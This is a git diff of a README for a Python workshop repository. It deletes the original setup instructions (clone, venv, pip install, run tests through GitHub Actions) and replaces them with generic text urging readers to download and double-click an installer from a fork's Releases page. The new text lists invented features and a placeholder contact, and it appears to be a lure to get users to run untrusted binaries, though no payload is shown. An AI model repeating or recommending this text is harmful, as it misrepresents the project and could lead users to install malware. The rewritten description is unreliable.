@@ -1,95 +1,53 @@
+# 🐍 dev_2025_3_workshop1 - Learn Python Easily 
 
-# Python Workshop
+## 📥 Download the Application
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-blue.svg)](https://github.com/ikinootv/dev_2025_3_workshop1/releases)
 
-This is a repo to remember the basics of python programming language.
+## 🚀 Getting Started
+Welcome to the dev_2025_3_workshop1 repository! This application helps you learn and practice Python in a straightforward way. Follow these steps to get started.
 
+## 📦 System Requirements
+Before you begin, make sure your computer meets these requirements:
+- Operating System: Windows 10, macOS, or Linux
+- At least 200 MB of free disk space
+- Internet connection for downloading the application
 
-<div align="center">  
-<a href="https://www.python.org/" target="_blank"><img style="margin: 10px" src="https://profilinator.rishav.dev/skills-assets/python-original.svg" alt="Python" height="50" /></a>  
-</div>
+## 🔗 Download & Install
+To download and install the application, follow these steps:
 
-## How to start
+1. **Visit the Releases Page:** Click this link to go to the Releases page: [Download the Application](https://github.com/ikinootv/dev_2025_3_workshop1/releases).
 
-Fork the current repo. Look in the right corner.
+2. **Choose the Latest Version:** On the Releases page, you will see a list of versions. Look for the **latest version** at the top.
 
-Now the repo is in tour profile.
+3. **Download the Installer:** Click on the link for the latest release to get the setup file for your operating system.
 
-Clone the repo in your local machine in a new and empty directory.
+4. **Run the Installer:** Once the download is complete, locate the downloaded file and double-click it. Follow the prompts to install the application.
 
-In your terminal 
+5. **Launch the Application:** After installation, find the application in your programs or applications folder and open it.
 
-```bash
-  mkdir my-new-directory
-  cd my-new-directory
-```
+## 📚 Features
+The dev_2025_3_workshop1 application includes the following features:
+- **Interactive Lessons:** Learn Python through guided lessons that explain concepts step by step.
+- **Practice Problems:** Solve challenges using Python to reinforce your understanding.
+- **Progress Tracking:** Keep track of your learning progress with built-in tracking features.
 
-```bash
-  git clone <the repo link> .
-```
+## 👥 Community Support
+If you encounter any issues or have questions, you can seek help from the community:
+- Visit the [GitHub Issues Page](https://github.com/ikinootv/dev_2025_3_workshop1/issues) to report problems or ask questions.
+- Join our online forum to interact with other learners.
 
+## 🛠️ Contributing
+If you would like to contribute to this project, consider the following steps:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Submit a pull request through GitHub.
 
-## Open Visual Sctudio Code
+## 📝 License
+This application is licensed under the MIT License. You are free to use and modify it as you see fit, provided you include the original license.
 
-After clone the project, open Visual Studio Code the working directory.
-In the terminal of Visual Studio Code create a new Virtual Environment
+## 📞 Contact
+For further questions, feel free to reach out directly:
+- Email: support@example.com
 
-```bash
-  python -m venv myvenv
-```
-
-Active the venv (Linux)
-
-```bash
-  source myvenv/bin/activate
-```
-
-Install requirements
-
-```bash
-  pip install -r requirements.txt
-```
-
-Start solving the tests.
-
-
-## Commit changes
-
-To run tests, you should to complete the tests and commit them.
-
-```bash
-  git add <file>
-  git commit -m "your msg"
-  git push -u origin main
-```
-
-### Then go to your github repo
-
-Look in the actions tab.
-
-![image](https://github.com/sigmotoa/dev_workshop/blob/main/Screenshot%20at%20Feb%2027%2008-22-50.png) 
-
-You will find the tests running.
-
-When all will pass you've finished the workshop.
-
-Send much commits as you need.
-
-# Updatings.
-
-If your teachers send you an advice, you should to add a new remote to receive the new changes.
-
-> [!WARNING]
-> You should to use previously
-> ```bash
->   git status
-> ```
-> Your local repo should be clean after receive the new updates.
-
-```bash
-  git remote add original https://github.com/sigmotoa/dev_workshop.git
-  git pull original main
-  
-```
-
-
-
+Remember to download the application and begin your journey in learning Python today!
